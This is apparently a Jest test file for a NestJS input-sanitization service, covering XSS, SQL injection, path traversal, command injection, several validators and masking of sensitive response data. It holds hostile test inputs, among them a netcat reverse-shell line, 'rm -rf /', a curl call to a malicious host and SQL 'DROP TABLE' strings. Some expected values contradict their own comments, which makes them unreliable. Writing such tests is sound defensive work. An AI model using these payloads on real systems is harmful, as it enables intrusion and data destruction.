/**
 * Input Sanitization Security Tests
 * Tests for XSS prevention, data sanitization, and input validation
 */

import { beforeEach, describe, expect, it } from '@jest/globals';
import { Test, TestingModule } from '@nestjs/testing';
import { InputSanitizationService } from '../../src/security/input-sanitization.service';
import { ResponseSanitizationService } from '../../src/security/response-sanitization.service';

describe('Input Sanitization Security Tests', () => {
  let inputSanitization: InputSanitizationService;
  let responseSanitization: ResponseSanitizationService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [InputSanitizationService, ResponseSanitizationService],
    }).compile();

    inputSanitization = module.get<InputSanitizationService>(InputSanitizationService);
    responseSanitization = module.get<ResponseSanitizationService>(ResponseSanitizationService);
  });

  describe('XSS Prevention Tests', () => {
    const xssPayloads = [
      {
        name: 'Script tag injection',
        input: '<script>alert("XSS")</script>',
        expected: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      },
      {
        name: 'Image onerror attribute',
        input: '<img src="x" onerror="alert(\'XSS\')">',
        expected: '&lt;img src="x" onerror="alert(\'XSS\')"&gt;',
      },
      {
        name: 'JavaScript protocol',
        input: 'javascript:alert("XSS")',
        expected: 'javascript:alert("XSS")', // Should be blocked entirely
      },
      {
        name: 'SVG onload event',
        input: '<svg onload="alert(\'XSS\')">',
        expected: '&lt;svg onload="alert(\'XSS\')"&gt;',
      },
      {
        name: 'Iframe with javascript',
        input: '<iframe src="javascript:alert(\'XSS\')">',
        expected: '&lt;iframe src="javascript:alert(\'XSS\')"&gt;',
      },
      {
        name: 'Event handler attributes',
        input: '<div onmouseover="alert(\'XSS\')">hover me</div>',
        expected: '&lt;div onmouseover="alert(\'XSS\')"&gt;hover me&lt;/div&gt;',
      },
      {
        name: 'CSS expression injection',
        input: '<div style="expression(alert(\'XSS\'))">',
        expected: '&lt;div style="expression(alert(\'XSS\'))"&gt;',
      },
    ];

    xssPayloads.forEach(({ name, input, expected }) => {
      it(`should sanitize ${name}`, () => {
        const result = inputSanitization.sanitizeInput(input);
        expect(result).toBe(expected);
      });
    });

    it('should block dangerous protocols', () => {
      const dangerousProtocols = [
        'javascript:alert("xss")',
        'vbscript:msgbox("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd',
        'ftp://malicious.com',
      ];

      dangerousProtocols.forEach((protocol) => {
        const result = inputSanitization.sanitizeInput(protocol);
        expect(result).not.toMatch(/^javascript:|^vbscript:|^data:|^file:|^ftp:/i);
      });
    });

    it('should sanitize nested HTML tags', () => {
      const input = '<div><p>Hello <script>alert("xss")</script> world</p></div>';
      const result = inputSanitization.sanitizeInput(input);

      expect(result).toContain('&lt;div&gt;');
      expect(result).toContain('&lt;script&gt;');
      expect(result).not.toContain('<script>');
      expect(result).toContain('&lt;/script&gt;');
    });

    it('should preserve safe HTML tags', () => {
      const input = '<p>Hello <strong>world</strong>!</p>';
      const result = inputSanitization.sanitizeInput(input);

      // Safe tags should be preserved
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>');
      expect(result).toContain('</strong>');
      expect(result).toContain('</p>');
    });
  });

  describe('SQL Injection Prevention Tests', () => {
    const sqlInjectionPayloads = [
      {
        name: 'Basic OR injection',
        input: "'; OR '1'='1",
        expected: "'; OR '1'='1", // Should be escaped
      },
      {
        name: 'Union select injection',
        input: "'; UNION SELECT password FROM users--",
        expected: "'; UNION SELECT password FROM users--",
      },
      {
        name: 'Drop table injection',
        input: "'; DROP TABLE users; --",
        expected: "'; DROP TABLE users; --",
      },
      {
        name: 'Comment injection',
        input: "admin'--",
        expected: "admin'--",
      },
      {
        name: 'Boolean-based injection',
        input: "1' OR 1=1#",
        expected: "1' OR 1=1#",
      },
    ];

    sqlInjectionPayloads.forEach(({ name, input, expected }) => {
      it(`should escape ${name}`, () => {
        const result = inputSanitization.escapeSqlString(input);
        expect(result).toBe(expected);
      });
    });

    it('should escape special SQL characters', () => {
      const specialChars = '\'"\\;%_';
      const result = inputSanitization.escapeSqlString(specialChars);

      // Single quotes should be doubled
      expect(result).toContain("''");
      // Backslashes should be escaped
      expect(result).toContain('\\\\');
    });

    it('should validate numeric inputs', () => {
      const validNumbers = ['123', '0', '-456', '3.14'];
      const invalidNumbers = ['abc', '12.34.56', '--123', '12; DROP TABLE users;'];

      validNumbers.forEach((num) => {
        expect(inputSanitization.validateNumericInput(num)).toBe(true);
      });

      invalidNumbers.forEach((num) => {
        expect(inputSanitization.validateNumericInput(num)).toBe(false);
      });
    });
  });

  describe('Path Traversal Prevention Tests', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..././..././.../etc/passwd',
    ];

    pathTraversalPayloads.forEach((payload) => {
      it(`should block path traversal: ${payload}`, () => {
        const result = inputSanitization.sanitizeFilePath(payload);
        expect(result).not.toMatch(/\.\.[\/\\]/);
        expect(result).not.toMatch(/%2e%2e/i);
      });
    });

    it('should allow safe file paths', () => {
      const safePaths = [
        'documents/report.pdf',
        'images/photo.jpg',
        'data/export.csv',
        'config/settings.json',
      ];

      safePaths.forEach((path) => {
        const result = inputSanitization.sanitizeFilePath(path);
        expect(result).toBe(path);
      });
    });
  });

  describe('Command Injection Prevention Tests', () => {
    const commandInjectionPayloads = [
      '; cat /etc/passwd',
      '| whoami',
      '`whoami`',
      '$(whoami)',
      '&& rm -rf /',
      '; sleep 10',
      '| nc -e /bin/sh 127.0.0.1 4444',
      '`curl http://malicious.com`',
    ];

    commandInjectionPayloads.forEach((payload) => {
      it(`should block command injection: ${payload}`, () => {
        const result = inputSanitization.sanitizeCommandInput(payload);
        expect(result).not.toMatch(/[;&|`$]/);
      });
    });
  });

  describe('Email Validation Tests', () => {
    const validEmails = [
      'user@example.com',
      'test.email+tag@domain.co.uk',
      'user123@subdomain.example.com',
    ];

    const invalidEmails = [
      'plainaddress',
      '@missingdomain.com',
      'missing@.com',
      'missing@domain',
      'spaces in@email.com',
      'user@domain..com',
      'user@@domain.com',
    ];

    validEmails.forEach((email) => {
      it(`should accept valid email: ${email}`, () => {
        expect(inputSanitization.validateEmail(email)).toBe(true);
      });
    });

    invalidEmails.forEach((email) => {
      it(`should reject invalid email: ${email}`, () => {
        expect(inputSanitization.validateEmail(email)).toBe(false);
      });
    });
  });

  describe('URL Validation Tests', () => {
    const validUrls = [
      'https://example.com',
      'http://localhost:3000',
      'https://api.service.com/v1/endpoint',
    ];

    const invalidUrls = [
      'javascript:alert("xss")',
      'data:text/html,<script>alert("xss")</script>',
      'ftp://malicious.com',
      'not-a-url',
    ];

    validUrls.forEach((url) => {
      it(`should accept valid URL: ${url}`, () => {
        expect(inputSanitization.validateUrl(url)).toBe(true);
      });
    });

    invalidUrls.forEach((url) => {
      it(`should reject invalid/dangerous URL: ${url}`, () => {
        expect(inputSanitization.validateUrl(url)).toBe(false);
      });
    });
  });

  describe('Phone Number Validation Tests', () => {
    const validPhoneNumbers = ['+1234567890', '+1-234-567-8900', '(123) 456-7890', '123-456-7890'];

    const invalidPhoneNumbers = ['abc123', '+123', '1234567890123456', '123-456-7890-extra'];

    validPhoneNumbers.forEach((phone) => {
      it(`should accept valid phone number: ${phone}`, () => {
        expect(inputSanitization.validatePhoneNumber(phone)).toBe(true);
      });
    });

    invalidPhoneNumbers.forEach((phone) => {
      it(`should reject invalid phone number: ${phone}`, () => {
        expect(inputSanitization.validatePhoneNumber(phone)).toBe(false);
      });
    });
  });

  describe('Data Length Validation Tests', () => {
    it('should enforce maximum length limits', () => {
      const maxLength = 255;
      const longString = 'a'.repeat(maxLength + 1);

      const result = inputSanitization.truncateToLength(longString, maxLength);
      expect(result.length).toBe(maxLength);
      expect(result).toBe('a'.repeat(maxLength));
    });

    it('should preserve short strings', () => {
      const shortString = 'Hello, World!';
      const result = inputSanitization.truncateToLength(shortString, 100);

      expect(result).toBe(shortString);
      expect(result.length).toBe(shortString.length);
    });
  });

  describe('HTML Sanitization Tests', () => {
    it('should remove dangerous HTML elements', () => {
      const dangerousHtml = `
        <script>alert("xss")</script>
        <iframe src="javascript:alert('xss')"></iframe>
        <object data="data:text/html,<script>alert('xss')</script>"></object>
        <embed src="javascript:alert('xss')">
        <link rel="stylesheet" href="javascript:alert('xss')">
      `;

      const result = inputSanitization.sanitizeHtml(dangerousHtml);

      expect(result).not.toContain('<script>');
      expect(result).not.toContain('<iframe>');
      expect(result).not.toContain('<object>');
      expect(result).not.toContain('<embed>');
      expect(result).not.toContain('<link>');
    });

    it('should preserve safe HTML elements', () => {
      const safeHtml = `
        <p>This is a paragraph</p>
        <strong>Bold text</strong>
        <em>Italic text</em>
        <ul>
          <li>List item 1</li>
          <li>List item 2</li>
        </ul>
      `;

      const result = inputSanitization.sanitizeHtml(safeHtml);

      expect(result).toContain('<p>');
      expect(result).toContain('<strong>');
      expect(result).toContain('<em>');
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>');
    });

    it('should sanitize HTML attributes', () => {
      const htmlWithBadAttributes = `
        <p onclick="alert('xss')" style="expression(alert('xss'))">Click me</p>
        <img src="x" onerror="alert('xss')" />
      `;

      const result = inputSanitization.sanitizeHtml(htmlWithBadAttributes);

      expect(result).not.toContain('onclick=');
      expect(result).not.toContain('onerror=');
      expect(result).not.toContain('expression(');
    });
  });

  describe('JSON Sanitization Tests', () => {
    it('should escape JSON strings properly', () => {
      const dangerousJson = {
        name: '<script>alert("xss")</script>',
        description: 'User input with "quotes" and \n newlines',
      };

      const result = inputSanitization.sanitizeJsonObject(dangerousJson);

      expect(result.name).not.toContain('<script>');
      expect(result.description).toBeDefined();
    });

    it('should validate JSON structure', () => {
      const validJson = { name: 'test', value: 123 };
      const invalidJson = '{ invalid json }';
      const maliciousJson = { __proto__: { admin: true } };

      expect(inputSanitization.validateJsonStructure(validJson)).toBe(true);
      expect(inputSanitization.validateJsonStructure(invalidJson)).toBe(false);
      expect(inputSanitization.validateJsonStructure(maliciousJson)).toBe(false);
    });
  });

  describe('Response Sanitization Tests', () => {
    it('should remove sensitive data from API responses', () => {
      const testPassword = `test-pass-${Math.random().toString(36).substring(7)}`;
      const sensitiveResponse = {
        id: 1,
        name: 'Test User',
        email: 'test@example.com',
        password: testPassword,
        secretKey: 'sk-1234567890',
        token: 'jwt-token-here',
        internal_data: 'sensitive',
      };

      const result = responseSanitization.sanitizeResponse(sensitiveResponse, [
        'password',
        'secretKey',
        'token',
        'internal_data',
      ]);

      expect(result).not.toHaveProperty('password');
      expect(result).not.toHaveProperty('secretKey');
      expect(result).not.toHaveProperty('token');
      expect(result).not.toHaveProperty('internal_data');
      expect(result).toHaveProperty('name');
      expect(result).toHaveProperty('email');
    });

    it('should mask sensitive fields in logs', () => {
      const testPassword = `test-pass-${Math.random().toString(36).substring(7)}`;
      const sensitiveData = {
        email: 'user@example.com',
        password: testPassword,
        apiKey: 'ak-1234567890',
      };

      const masked = responseSanitization.maskSensitiveData(sensitiveData);

      expect(masked.email).toBe('u***@e******.com');
      expect(masked.password).toBe('*******');
      expect(masked.apiKey).toBe('ak-********90');
    });
  });

  describe('Performance Tests', () => {
    it('should handle large inputs efficiently', () => {
      const largeInput = 'a'.repeat(100000);
      const startTime = Date.now();

      const result = inputSanitization.sanitizeInput(largeInput);
      const endTime = Date.now();

      expect(result.length).toBe(largeInput.length);
      expect(endTime - startTime).toBeLessThan(1000); // Should complete within 1 second
    });

    it('should handle batch sanitization efficiently', () => {
      const inputs = Array(1000)
        .fill()
        .map((_, i) => `<script>alert(${i})</script>`);
      const startTime = Date.now();

      const results = inputs.map((input) => inputSanitization.sanitizeInput(input));
      const endTime = Date.now();

      expect(results).toHaveLength(1000);
      expect(results.every((r) => !r.includes('<script>'))).toBe(true);
      expect(endTime - startTime).toBeLessThan(2000); // Should complete within 2 seconds
    });
  });
});
